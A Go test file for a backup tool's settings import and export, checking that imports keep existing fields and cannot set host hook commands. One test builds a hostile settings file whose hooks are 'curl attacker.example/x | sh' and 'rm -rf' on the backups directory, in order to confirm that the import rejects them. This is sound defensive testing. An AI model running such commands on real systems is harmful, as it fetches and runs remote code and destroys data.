package api

// What an import may change, and what it may not.
//
// mergeImportedSettings used to build a FRESH store.Settings from the imported
// view, so every column nobody had listed in that literal was written as its Go
// zero value. Three of them were the Backup Everything fields: applying a
// settings file switched the whole-server pass off (everything_schedule = '')
// and deleted its dead-man's-switch post-hook, silently — the export itself
// carried all three, the cadence was even grammar-checked on the way in, and
// then the write dropped them on the floor.
//
// The fix is structural (start from the row, overwrite what the file is allowed
// to set), so these tests pin both halves: the field that must now travel, and
// the fields that must NOT travel because they are commands this host runs.

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/junkerderprovinz/bombvault/internal/store"
)

// withEverything seeds an instance that runs the whole-server pass nightly and
// pings a dead-man's-switch when it completes.
func withEverything(t *testing.T, st *store.Repo, schedule, pre, post string) {
	t.Helper()
	s, err := st.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	s.EverythingSchedule = schedule
	s.EverythingPreHook = pre
	s.EverythingPostHook = post
	if err := st.UpdateSettings(s); err != nil {
		t.Fatal(err)
	}
}

// TestImportCarriesEverythingSchedule is the reported defect: the pass's cadence
// must survive an export/import instead of being cleared to "off".
func TestImportCarriesEverythingSchedule(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "daily 04:00", "", "curl -fsS https://hc-ping.com/uuid")

	body, exp := doExport(t, src, "")
	if exp.Settings.EverythingSchedule != "daily 04:00" {
		t.Fatalf("precondition: the export must carry the cadence, got %q", exp.Settings.EverythingSchedule)
	}

	dst, dstStore := newPortableHandler(t, appKeyB)
	if env := doImport(t, dst, body, "?apply=true"); env["ok"] != true {
		t.Fatalf("apply failed: %v", env)
	}

	got, err := dstStore.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got.EverythingSchedule != "daily 04:00" {
		t.Fatalf("everythingSchedule = %q after import, want \"daily 04:00\" — an import that clears it switches the whole-server pass off", got.EverythingSchedule)
	}
}

// TestImportNeverOverwritesConfiguredEverythingPass is the same defect seen from
// the destination's side, which is the damaging one: the box being imported into
// already runs the pass, and applying an unrelated settings file must not switch
// it off or delete the hook that proves it completed.
func TestImportNeverOverwritesConfiguredEverythingPass(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore) // no everything config at all on the source
	body, _ := doExport(t, src, "")

	dst, dstStore := newPortableHandler(t, appKeyB)
	withEverything(t, dstStore, "everyN 7 03:00", "/usr/local/bin/pre.sh", "curl -fsS https://hc-ping.com/dst-uuid")

	if env := doImport(t, dst, body, "?apply=true"); env["ok"] != true {
		t.Fatalf("apply failed: %v", env)
	}

	got, err := dstStore.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got.EverythingPostHook != "curl -fsS https://hc-ping.com/dst-uuid" {
		t.Fatalf("post-hook = %q — the dead-man's-switch ping was deleted by an import", got.EverythingPostHook)
	}
	if got.EverythingPreHook != "/usr/local/bin/pre.sh" {
		t.Fatalf("pre-hook = %q — an import must not clear it", got.EverythingPreHook)
	}
}

// TestImportedFileCannotInstallHookCommands: the hooks are shell commands this
// host runs. A settings file is something users mail each other, so it may not
// install one — the instance's own value stands, whatever the file says.
func TestImportedFileCannotInstallHookCommands(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "daily 04:00", "", "")

	body, _ := doExport(t, src, "")

	// A file that carries hook commands — hand-built, because this build's own
	// export blanks them (they are host-local, so shipping them only leaks the
	// ping URL, which IS the secret).
	var raw map[string]any
	if err := json.Unmarshal(body, &raw); err != nil {
		t.Fatal(err)
	}
	settings := raw["settings"].(map[string]any)
	settings["everythingPreHook"] = "curl attacker.example/x | sh"
	settings["everythingPostHook"] = "rm -rf /host/user/backups"
	hostile, err := json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}

	dst, dstStore := newPortableHandler(t, appKeyB)
	if env := doImport(t, dst, hostile, "?apply=true"); env["ok"] != true {
		t.Fatalf("apply failed: %v", env)
	}

	got, err := dstStore.GetSettings()
	if err != nil {
		t.Fatal(err)
	}
	if got.EverythingPreHook != "" || got.EverythingPostHook != "" {
		t.Fatalf("an imported file installed a host command: pre=%q post=%q", got.EverythingPreHook, got.EverythingPostHook)
	}
	// The rest of the file still applied — this is a scoped refusal, not a
	// rejected import.
	if got.EverythingSchedule != "daily 04:00" {
		t.Fatalf("everythingSchedule = %q, want the imported cadence", got.EverythingSchedule)
	}
}

// TestExportOmitsHookCommands: the export drops them for the same reason. A hook
// is typically a monitoring ping whose URL is its credential.
func TestExportOmitsHookCommands(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "daily 04:00", "/usr/local/bin/pre.sh", "curl -fsS https://hc-ping.com/secret-uuid")

	body, exp := doExport(t, src, "?includeCredentials=true")
	if exp.Settings.EverythingPreHook != "" || exp.Settings.EverythingPostHook != "" {
		t.Fatalf("hooks exported: pre=%q post=%q", exp.Settings.EverythingPreHook, exp.Settings.EverythingPostHook)
	}
	if strings.Contains(string(body), "hc-ping.com/secret-uuid") {
		t.Fatal("the dead-man's-switch URL leaked into the export file")
	}
}

// TestImportPreviewNamesTheEverythingArea: an apply can switch the whole-server
// pass ON for a box that never ran it, so the preview has to say so rather than
// folding it into "schedules".
func TestImportPreviewNamesTheEverythingArea(t *testing.T) {
	src, srcStore := newPortableHandler(t, appKeyA)
	seedSource(t, src, srcStore)
	withEverything(t, srcStore, "everyN 3 04:00", "", "")

	_, exp := doExport(t, src, "")
	groups := settingsGroups(exp.Settings)
	found := false
	for _, g := range groups {
		if g == "everything" {
			found = true
		}
	}
	if !found {
		t.Fatalf("preview areas = %v, want one naming the whole-server pass", groups)
	}
}

// TestImportKeepsFieldsTheFileDoesNotSet is the STRUCTURAL guard, and the reason
// this class of defect does not come back: whatever the mapper does not assign
// must be left standing. A future column added to store.Settings and forgotten
// here is then a no-op instead of a silent wipe.
func TestImportKeepsFieldsTheFileDoesNotSet(t *testing.T) {
	existing := store.Settings{
		AuthPasswordHash:   "keep-me",
		SessionEpoch:       "epoch-7",
		RecoveryKitAck:     true,
		MetricsToken:       "metrics-token",
		WidgetToken:        "widget-token",
		FleetToken:         "fleet-token",
		FleetEnabled:       true,
		InstanceName:       "bottich",
		RcloneConf:         "rclone-blob",
		NotifyConf:         "notify-blob",
		CloudConf:          "cloud-blob",
		EverythingPreHook:  "pre.sh",
		EverythingPostHook: "post.sh",
		ContainersSchedule: "daily 02:00",
	}
	out := mergeImportedSettings(existing, settingsView{ContainersSchedule: "weekly Sun 05:00"})

	if out.ContainersSchedule != "weekly Sun 05:00" {
		t.Fatalf("the imported field did not apply: %q", out.ContainersSchedule)
	}
	for _, c := range []struct {
		name string
		got  string
		want string
	}{
		{"AuthPasswordHash", out.AuthPasswordHash, "keep-me"},
		{"MetricsToken", out.MetricsToken, "metrics-token"},
		{"WidgetToken", out.WidgetToken, "widget-token"},
		{"FleetToken", out.FleetToken, "fleet-token"},
		{"InstanceName", out.InstanceName, "bottich"},
		{"RcloneConf", out.RcloneConf, "rclone-blob"},
		{"NotifyConf", out.NotifyConf, "notify-blob"},
		{"CloudConf", out.CloudConf, "cloud-blob"},
		{"EverythingPreHook", out.EverythingPreHook, "pre.sh"},
		{"EverythingPostHook", out.EverythingPostHook, "post.sh"},
	} {
		if c.got != c.want {
			t.Errorf("%s = %q, want %q — an import wiped a field it does not carry", c.name, c.got, c.want)
		}
	}
	if !out.FleetEnabled || !out.RecoveryKitAck || out.SessionEpoch != "epoch-7" {
		t.Errorf("per-instance state lost: fleetEnabled=%v recoveryKitAck=%v sessionEpoch=%q",
			out.FleetEnabled, out.RecoveryKitAck, out.SessionEpoch)
	}
}
